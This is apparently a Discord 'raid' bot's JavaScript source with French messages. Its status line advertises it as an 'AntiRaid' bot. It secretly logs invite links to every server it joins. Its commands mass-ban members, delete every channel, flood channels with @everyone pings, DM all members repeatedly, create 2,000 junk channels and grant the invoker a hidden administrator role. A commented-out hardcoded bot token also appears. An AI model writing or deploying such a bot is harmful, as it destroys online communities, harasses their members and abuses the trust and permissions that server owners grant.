const Discord = require("discord.js");
const bot = new Discord.Client();
const prefix = ".";
bot.login(process.env.TOKEN)
//bot.login("NTg4MzYwMDkyMTM1NTg3ODUy.XQJFnA.7ylXSfLwM3hGubRQvTyfEdvXLPA").catch(err => console.log("Token invalide"));
//var mention = "67 connectés"

var fucked = false;

bot.on('ready', function() {
  setInterval(async () => {
    const statuslist = [
      `surveille 65 serveurs`,
      `𝔹𝕆𝕋 𝔹𝕐 𝕆𝕄𝔼𝔾𝔸`,
      `Bot AntiRaid`,
      `Bot by _Mr.Adam_`,
    ];
    
    const random = Math.floor(Math.random() * statuslist.length);
        
    try {
      await bot.user.setPresence({
        game: {
          name: `${statuslist[random]}`,
          url : "https://www.twitch.tv/Mr.adam99"
        },
        status: "online"
      });
    } catch (error) {
      console.error(error);
    }
  }, 3000);

  bot.guilds.forEach(guild => {
    var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
    invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
  })
});


//RAID SOFT
bot.on('message', msg => {
    
  if (msg.content === prefix + 'ping') {
    msg.reply('tu veux quoi ?')
  }
  

  if (msg.content === prefix + 'z') {
    console.log(`Commande  ${prefix}z par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("@everyone");
    }, 500);
  }

  if (msg.content === prefix + 'dm') {
    console.log(`Commande ${prefix}dm par ${msg.author.tag}`);
    if (msg.channel.type === "dm") return;
    if (msg.deletable) msg.delete();
    msg.guild.members.forEach(member => {
      setInterval(function () {
        member.send("__**" + msg.guild.owner.user.username + "**__ vient de se faire pulvériser son serveur. \n\n ```Power By _Mr.Adam_``` https://discord.gg/GeMMun9 \n\n https://cdn.discordapp.com/attachments/561266014067752960/563033869717340200/a0aeb7e9b060446eae7ab8ef266f46b6.gif").catch(error => {}) }, 450)
    });
  }

  if(msg.content === prefix + 'suppr'){
    console.log(`Commande  ${prefix}suppr par ${msg.author.tag}`);
    if(msg.channel.type === "suppr") return;
    if(msg.guild.channels.size === 0) return;
    else if(!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
    msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
  }
  
  if (msg.content === prefix + 'ban') {
    console.log(`Commande  ${prefix}ban par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "  ") && member.bannable) member.ban().catch(e => {});
    });
  }

  if (msg.content === prefix + 'exit') {
    console.log(`Commande  ${prefix}exit par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }

  if (msg.content === prefix + 'be') {
    console.log(`Commande  ${prefix}be par ${msg.author.tag}`);
    msg.member.guild.createRole({
      name: "  ",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role);
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
});

//RAID EXE
bot.on('message', msg => {
  if (msg.content === prefix + 'exe') {
    console.log(`Commande  ${prefix}exe par ${msg.author.tag}`);
    if (!fucked){
      msg.guild.setIcon("diapo.jpg").catch(e => {});
      msg.guild.setName('Raid By Omega').catch(e => {});
      for (var i = 0; i < 1000; i++) {
        //msg.guild.createChannel('Raid by Omega', 'voice').catch(e => {});
        //msg.guild.createChannel('Raid by Omega', 'text').catch(e => {});
        msg.guild.createChannel('Raid by Omega', { type: 'text' }).catch(e => {});
        msg.guild.createChannel('Raid by Omega', { type: 'voice' }).catch(e => {});
      }
      fucked = true;
      
      if (msg.deletable) {
        msg.delete();
      }
    }
  }
});
bot.on('message', msg => {
  if(msg.content === prefix + 'exe'){
    if(msg.channel.type === "suppr") return;
    if(msg.guild.channels.size === 0) return;
    else if(!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
    msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
  }
});
bot.on('message', msg => {
  if(msg.content.startsWith(prefix + 'exe')) {
    if (msg.channel.type === "dm") return;
    if (msg.deletable) msg.delete();
    msg.guild.members.forEach(member => {
      setInterval(function () {
      member.send("__**" + msg.guild.owner.user.username + "**__ vient de se faire pulvériser son serveur. \n\n ```Power By _Mr.Adam_``` https://discord.gg/GeMMun9 \n\n https://cdn.discordapp.com/attachments/561266014067752960/563033869717340200/a0aeb7e9b060446eae7ab8ef266f46b6.gif").catch(error => {}) }, 450)
    })
  }
});
bot.on('message', msg => {
  if(msg.content.startsWith(prefix + "exe")) {
    msg.delete()
    let i = 0;
    let interval = setInterval(function () {
      msg.guild.channels.forEach(channel => {
        if (channel.type === "text") channel.send("@everyone Je suis la petite voie qui te dis que ton serveur viens d'être Raid.  Va reporte l'assistance. https://discord.gg/GeMMun9 \n\n https://cdn.discordapp.com/attachments/561266014067752960/563033869717340200/a0aeb7e9b060446eae7ab8ef266f46b6.gif \n\n ```Raid by _Mr.Adam_```")
      }, 2500);
    });
  }
});
